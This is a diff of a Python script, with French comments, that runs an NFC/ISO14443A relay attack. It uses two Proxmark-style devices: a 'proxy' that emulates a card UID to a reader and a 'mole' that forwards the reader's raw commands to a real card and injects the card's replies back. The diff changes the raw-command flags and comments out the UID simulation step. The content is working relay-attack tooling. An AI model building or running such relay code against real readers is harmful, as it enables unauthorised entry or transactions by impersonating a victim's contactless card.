@@ -30,7 +30,7 @@ def start_relay():
         # On suppose que tu connais l'UID (ex: 045978CA341290)
         uid = "045978CA341290"
         print(f"[*] Simulation de l'UID {uid}...")
-        send_cmd(proxy, f"hf 14a sim -t 2 -u {uid}")
+        #send_cmd(proxy, f"hf 14a sim -t 2 -u {uid}")
         time.sleep(1) 
 
         print("[*] Relai actif. En attente du lecteur...")
@@ -48,7 +48,7 @@ def start_relay():
 
                     # ENVOI AU MOLE (PC -> Carte)
                     # On utilise 'hf 14a raw' car c'est le plus rapide pour une commande brute
-                    send_cmd(mole, f"hf 14a raw -c {cmd_hex}")
+                    send_cmd(mole, f"hf 14a raw -akc {cmd_hex}")
                     
                     # LECTURE DU MOLE (Carte -> PC)
                     # On boucle brièvement pour choper la réponse de la carte
@@ -59,7 +59,7 @@ def start_relay():
                         if res_hex:
                             print(f" [Mole] -> Carte: {res_hex}")
                             # INJECTION DANS LE PROXY (PC -> Lecteur)
-                            send_cmd(proxy, f"hf 14a raw {res_hex}")
+                            send_cmd(proxy, f"hf 14a raw -ak {res_hex}")
                             break
 
     except KeyboardInterrupt:
